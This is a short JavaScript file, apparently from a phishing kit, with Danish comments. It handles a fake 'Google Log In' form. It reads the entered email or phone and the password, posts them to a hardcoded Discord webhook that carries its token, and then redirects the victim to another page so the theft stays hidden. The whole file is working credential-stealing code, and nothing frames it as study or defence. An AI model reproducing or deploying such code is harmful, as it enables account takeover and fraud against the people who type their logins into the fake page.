const webhookURL = "https://discord.com/api/webhooks/1466432716991107289/UAWT4tbB1X-QDF3-ENHh0mTpowhjE1Lvy3Zxf9VY0KOmbdAf0p1eyc3headKLzEnNtg9";

const form = document.querySelector(".form");
const button = document.querySelector(".form-button");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  // Loading state
  button.disabled = true;
  const originalText = button.textContent;
  button.textContent = "Loading...";

const emailorphoneInput = document.querySelector('input[name="emailorphone"]');
const emailorphone = emailorphoneInput.value; // sender kun email/phone
const passwordInput = document.querySelector('input[name="password"]');
const password = passwordInput.value; 


  // 🔔 Webhook: send email/phone til Discord
  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `Google Log In\n Email/Phone: ${emailorphone}\n Password: ${password}`
    })
  }).catch(() => {}); // fejl stopper ikke login

  setTimeout(() => {
    // Gendan knap og nulstil form
    button.textContent = originalText;
    button.disabled = false;
    form.reset();

    // Redirect fra localStorage (eller fallback)
    const redirectLink = localStorage.getItem("redirectLink") || "profil.html";
    window.location.href = redirectLink;
  }, 1200);
});
